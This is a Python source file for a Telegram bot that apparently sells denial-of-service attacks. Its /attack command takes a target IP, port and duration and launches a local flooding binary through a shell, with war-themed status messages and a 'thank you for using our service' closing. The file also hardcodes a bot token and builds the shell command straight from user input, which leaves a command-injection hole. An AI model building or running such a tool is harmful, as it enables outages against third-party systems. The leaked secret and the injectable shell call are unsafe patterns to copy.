import os
import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
from telegram.error import TelegramError

TELEGRAM_BOT_TOKEN = '8150713241:AAHvmCNoj9ks3uDATQi9jOuxuXYcmuPmeoA'
active_attacks = {}  # Dictionary to keep track of active attacks by IP
MAX_ATTACK_TIME = 90  # Maximum attack duration in seconds

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*🔥 Welcome to the battlefield! 🔥*\n\n"
        "*Use /attack <ip> <port> <duration>*\n"
        "*Let the war begin! ⚔️💥*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def run_attack(chat_id, ip, port, duration, context):
    try:
        process = await asyncio.create_subprocess_shell(
            f"./ultra {ip} {port} {duration}",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        
        # Send updates every second for the remaining attack time
        for remaining_time in range(duration, 0, -1):
            await context.bot.send_message(
                chat_id=chat_id,
                text=f"*⚔️ Attack on {ip}:{port} in progress...*\n*⏳ Remaining time: {remaining_time} seconds*",
                parse_mode='Markdown'
            )
            await asyncio.sleep(1)  # Wait for 1 second before updating again

        # Wait for the process to finish (handle output)
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except asyncio.TimeoutError:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ The attack on {ip} exceeded the maximum allowed time of {MAX_ATTACK_TIME} seconds and was terminated.*", parse_mode='Markdown')
    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
        # Remove the IP from active attacks once the attack is complete or terminated
        active_attacks.pop(ip, None)
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our service!*", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
        return

    ip, port, duration = args

    # Convert the duration to an integer and ensure it's capped at the max allowed attack time
    try:
        duration = int(duration)
    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Invalid duration. Please enter a valid number for duration.*", parse_mode='Markdown')
        return
    
    duration = min(duration, MAX_ATTACK_TIME)  # Cap the duration to 90 seconds

    # Check if the IP is already under attack
    if ip in active_attacks:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ The IP {ip} is already under attack! Please wait for it to finish before trying again.*", parse_mode='Markdown')
        return

    # Mark the IP as under attack
    active_attacks[ip] = True

    await context.bot.send_message(chat_id=chat_id, text=( 
        f"*⚔️ Attack Launched! ⚔️*\n"
        f"*🎯 Target: {ip}:{port}*\n"
        f"*🕒 Duration: {duration} seconds*\n"
        f"*🔥 Let the battlefield ignite! 💥*"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))

    application.run_polling()

if __name__ == '__main__':
    main()
